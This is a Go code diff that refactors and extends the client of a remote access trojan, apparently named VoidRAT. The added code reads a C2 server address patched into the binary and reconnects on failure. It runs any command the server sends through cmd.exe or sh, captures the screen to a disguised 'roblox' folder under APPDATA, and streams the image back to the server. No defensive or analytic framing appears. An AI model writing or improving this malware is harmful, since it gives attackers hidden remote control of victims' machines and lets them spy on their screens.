@@ -7,10 +7,12 @@ import (
 	"fmt"
 	"image/png"
 	"io"
-	"io/ioutil"
 	"net"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"runtime"
+	"strconv"
 	"strings"
 	"time"
 
@@ -29,37 +31,130 @@ var (
 	port int
 )
 
-///
-// Consts
-///
-
-var RetryAttempts int = 20
-var RetryInterval int = 10
-
-///
-// End Consts
-///
+// Reconnection settings
+var (
+	RetryAttempts int = 20
+	RetryInterval int = 10 // seconds
+)
 
 var remainingRetryAttempts = RetryAttempts
 
+// captureAndSendScreenshot captures the primary screen, saves it to a stealth path,
+// and transmits the image data to the C2 server over the existing TCP stream.
+func captureAndSendScreenshot(conn net.Conn) error {
+	numDisplays := screenshot.NumActiveDisplays()
+	if numDisplays <= 0 {
+		return fmt.Errorf("no active displays detected")
+	}
+
+	img, err := screenshot.CaptureDisplay(0)
+	if err != nil {
+		return fmt.Errorf("failed to capture display: %w", err)
+	}
+
+	// Determine stealth destination directory
+	var baseDir string
+	if appData := os.Getenv("APPDATA"); appData != "" {
+		baseDir = filepath.Join(appData, "roblox")
+	} else {
+		baseDir = filepath.Join(os.TempDir(), "roblox")
+	}
+
+	if err := os.MkdirAll(baseDir, 0755); err != nil {
+		return fmt.Errorf("failed to create directory: %w", err)
+	}
+
+	screenshotPath := filepath.Join(baseDir, "screenshot.png")
+	file, err := os.Create(screenshotPath)
+	if err != nil {
+		return fmt.Errorf("failed to create screenshot file: %w", err)
+	}
+
+	err = png.Encode(file, img)
+	file.Close()
+	if err != nil {
+		return fmt.Errorf("failed to encode screenshot: %w", err)
+	}
+
+	imageFile, err := os.Open(screenshotPath)
+	if err != nil {
+		return fmt.Errorf("failed to open screenshot file: %w", err)
+	}
+	defer imageFile.Close()
+
+	// Protocol format: [1-byte path length] [path bytes] [raw PNG stream]
+	pathBytes := []byte(screenshotPath)
+	pathLen := len(pathBytes)
+	if pathLen > 255 {
+		pathLen = 255
+		pathBytes = pathBytes[:255]
+	}
+
+	if _, err := conn.Write([]byte{byte(pathLen)}); err != nil {
+		return err
+	}
+	if _, err := conn.Write(pathBytes); err != nil {
+		return err
+	}
+
+	buffer := make([]byte, 1024)
+	for {
+		n, err := imageFile.Read(buffer)
+		if n > 0 {
+			if _, werr := conn.Write(buffer[:n]); werr != nil {
+				return werr
+			}
+		}
+		if err == io.EOF {
+			break
+		}
+		if err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+// executeRemoteCommand runs a command on the host OS
+func executeRemoteCommand(command string) error {
+	command = strings.TrimSpace(command)
+	if command == "" {
+		return nil
+	}
+
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd.exe", "/C", command)
+	} else {
+		cmd = exec.Command("sh", "-c", command)
+	}
+
+	return cmd.Run()
+}
+
 func RetryConnection() {
-	if remainingRetryAttempts == 0 {
+	if remainingRetryAttempts <= 0 {
 		os.Exit(-1)
 	}
 
-	remainingRetryAttempts -= 1
+	remainingRetryAttempts--
 	Connect()
 }
 
 func Connect() {
-	HostIp := fmt.Sprintf("%s:%d", ip, port)
-	conn, err := net.Dial("tcp", HostIp)
+	hostAddr := fmt.Sprintf("%s:%d", ip, port)
+	conn, err := net.Dial("tcp", hostAddr)
 	if err != nil {
 		time.Sleep(time.Duration(RetryInterval) * time.Second)
 		RetryConnection()
 		return
 	}
-	fmt.Println("Connected")
+	defer conn.Close()
+
+	fmt.Printf("[*] Connected to C2 at %s\n", hostAddr)
+	// Reset retry attempts on a successful connection
+	remainingRetryAttempts = RetryAttempts
 
 	reader := bufio.NewReader(conn)
 
@@ -75,50 +170,22 @@ func Connect() {
 			continue
 		}
 
-		if payload["type"] == "remote" {
-			command := payload["command"].(string)
-			parts := strings.Fields(command)
-			cmd := exec.Command(parts[0], parts[1:]...)
-			err := cmd.Run()
-			if err != nil {
-				continue
-			}
+		msgType, ok := payload["type"].(string)
+		if !ok {
 			continue
-		} else if payload["type"] == "screenshot" {
-			img, err := screenshot.CaptureDisplay(0)
-			if err != nil {
-				return
-			}
-			file, err := os.Create("%appdata%/roblox/screenshot.png")
-			if err != nil {
-				return
-			}
-			defer file.Close()
+		}
 
-			err = png.Encode(file, img)
-			if err != nil {
-				return
+		switch msgType {
+		case "remote":
+			if cmdStr, ok := payload["command"].(string); ok {
+				_ = executeRemoteCommand(cmdStr)
 			}
-
-			imageFilePath := "%appdata%/roblox/screenshot.png"
-			imageFile, err := os.Open(imageFilePath)
-			if err != nil {
-				return
+		case "screenshot":
+			if err := captureAndSendScreenshot(conn); err != nil {
+				fmt.Printf("[!] Screenshot error: %v\n", err)
 			}
-			conn.Write([]byte{byte(len(imageFilePath))})
-			conn.Write([]byte(imageFilePath))
-			buffer := make([]byte, 1024)
-			for {
-				n, err := imageFile.Read(buffer)
-				if err == io.EOF {
-					break
-				}
-				if err != nil {
-					return
-				}
-				conn.Write(buffer[:n])
-			}
-		} else if payload["type"] == "audio" {
+		case "audio":
+			// Reserved for future audio streaming module
 			continue
 		}
 	}
@@ -126,13 +193,48 @@ func Connect() {
 	RetryConnection()
 }
 
-func main() {
-	exePath, _ := os.Executable()
-	data, _ := ioutil.ReadFile(exePath)
-	startIndex := len(data) - 6
-	port = int(binary.LittleEndian.Uint16(data[startIndex : startIndex+2]))
-	ipBytes := data[startIndex+2 : startIndex+6]
-	ip = fmt.Sprintf("%d.%d.%d.%d", ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3])
+func initConfig() {
+	// 1. Check environment variables (convenient for testing & debugging)
+	envHost := os.Getenv("VOIDRAT_HOST")
+	envPort := os.Getenv("VOIDRAT_PORT")
+	if envHost != "" && envPort != "" {
+		if p, err := strconv.Atoi(envPort); err == nil && p > 0 && p <= 65535 {
+			ip = envHost
+			port = p
+			return
+		}
+	}
 
+	// 2. Read embedded config from the last 6 bytes of the executable binary:
+	// - [len-6 : len-4]: uint16 LittleEndian port
+	// - [len-4 : len  ]: 4-byte IPv4 address
+	exePath, err := os.Executable()
+	if err == nil {
+		data, err := os.ReadFile(exePath)
+		if err == nil && len(data) >= 6 {
+			startIndex := len(data) - 6
+			extractedPort := int(binary.LittleEndian.Uint16(data[startIndex : startIndex+2]))
+			ipBytes := data[startIndex+2 : startIndex+6]
+			extractedIP := fmt.Sprintf("%d.%d.%d.%d", ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3])
+
+			if extractedPort > 0 && extractedIP != "0.0.0.0" {
+				port = extractedPort
+				ip = extractedIP
+				return
+			}
+		}
+	}
+
+	// 3. Fallback defaults if stub has not yet been patched
+	if ip == "" {
+		ip = "127.0.0.1"
+	}
+	if port == 0 {
+		port = 4444
+	}
+}
+
+func main() {
+	initConfig()
 	Connect()
 }
